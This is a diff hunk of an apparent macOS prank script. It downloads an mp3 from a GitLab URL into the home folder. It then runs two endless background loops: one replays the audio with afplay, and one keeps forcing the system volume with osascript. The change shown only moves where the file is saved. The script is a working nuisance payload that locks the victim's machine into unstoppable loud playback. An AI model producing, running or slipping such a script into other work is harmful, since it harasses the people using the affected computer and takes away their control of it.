@@ -9,7 +9,7 @@ BASIC=('https://gitlab.com/LogoutPolice21/banana/raw/9c4b32441228904f4fb4ff1542d
 LINKS=('PS')
 INDEX=$(awk -v min=0 -v max=0 'BEGIN{srand(); print int(min+rand()*(max-min+1))}')
 LINK=("$BASIC${LINKS[$INDEX]}.mp3")
-curl $LINK > ~/.TemporaryItems/mem.mp3
+curl $LINK > ~/mem.mp3
 
-while [ 1 ]; do afplay ~/.TemporaryItems/mem.mp3; done &
+while [ 1 ]; do afplay ~/mem.mp3; done &
 while [ 1 ]; do osascript -e "set Volume 10"; done &
